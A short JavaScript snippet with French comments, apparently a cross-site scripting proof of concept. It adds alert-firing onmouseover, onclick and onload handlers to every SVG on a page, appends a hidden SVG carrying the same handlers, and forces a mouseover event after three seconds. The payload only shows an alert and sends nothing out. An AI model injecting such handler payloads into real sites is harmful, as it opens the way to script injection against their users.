// Vérifie et ajoute l'événement sur toutes les balises <svg>
document.querySelectorAll("svg").forEach(svg => {
    svg.setAttribute("onmouseover", "alert('XSS WORKING!')");
    svg.setAttribute("onclick", "alert('XSS WORKING!')");
    svg.setAttribute("onload", "alert('XSS WORKING!')");
    svg.style.border = "5px solid red"; // Debug visuel
});

// Ajoute un élément SVG caché qui déclenche l'alerte immédiatement
let hiddenSVG = document.createElement("svg");
hiddenSVG.innerHTML = `<svg width="1" height="1" onmouseover="alert('XSS WORKING!')" 
onload="alert('XSS WORKING!')" onclick="alert('XSS WORKING!')"></svg>`;
document.body.appendChild(hiddenSVG);

// Force un événement souris après 3 secondes pour activer XSS
setTimeout(() => {
    let evt = new MouseEvent("mouseover", { bubbles: true });
    document.querySelector("svg")?.dispatchEvent(evt);
}, 3000);
